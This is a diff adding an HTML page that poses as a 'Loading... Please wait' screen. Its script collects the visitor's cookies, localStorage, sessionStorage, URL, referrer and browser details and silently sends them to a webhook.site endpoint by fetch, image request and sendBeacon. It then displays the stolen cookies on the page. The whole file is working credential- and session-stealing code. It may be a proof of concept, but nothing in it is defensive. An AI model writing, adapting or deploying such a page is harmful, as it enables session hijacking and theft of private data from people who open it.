@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<h2>Please wait...</h2>
+<script>
+// Get webhook from URL
+const params = new URLSearchParams(window.location.search);
+const webhook = params.get('webhook') || 'b1647e17-560f-4643-a2d6-14043b4a0eda';
+
+// Collect ONLY real cookies (NO fake injection)
+const allData = {
+    cookies: document.cookie || "No cookies found in this browser",
+    cookieCount: document.cookie ? document.cookie.split(';').length : 0,
+    localStorage: JSON.stringify(localStorage) || "{}",
+    sessionStorage: JSON.stringify(sessionStorage) || "{}",
+    url: window.location.href,
+    referrer: document.referrer,
+    timestamp: Date.now(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language
+};
+
+// Send to webhook
+fetch(`https://webhook.site/${webhook}`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(allData)
+}).catch(() => {});
+
+// Send via image
+new Image().src = `https://webhook.site/${webhook}?cookies=${encodeURIComponent(document.cookie)}`;
+
+// Send via beacon
+if (navigator.sendBeacon) {
+    navigator.sendBeacon(`https://webhook.site/${webhook}`, JSON.stringify(allData));
+}
+
+// Show what was captured
+document.body.innerHTML += `<p>📊 Cookies found: ${document.cookie ? document.cookie.split(';').length : 0}</p>`;
+document.body.innerHTML += `<p>🍪 ${document.cookie || 'No cookies found'}</p>`;
+</script>
+</body>
+</html>
